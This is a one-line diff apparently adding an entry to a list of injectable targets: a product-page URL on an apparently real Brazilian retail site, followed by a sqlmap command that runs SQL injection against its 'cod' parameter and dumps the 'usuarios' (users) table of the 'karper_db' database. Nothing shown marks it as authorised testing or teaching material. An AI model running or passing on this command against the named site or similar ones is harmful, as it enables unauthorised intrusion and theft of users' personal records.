@@ -1,0 +1,1 @@
+https://www.karper.com.br/produto.php?cod=34 (GET)  # sqlmap.py --threads 5 -v3 --random-agent -u https://www.karper.com.br/produto.php?cod=34 -D karper_db -T usuarios --dump
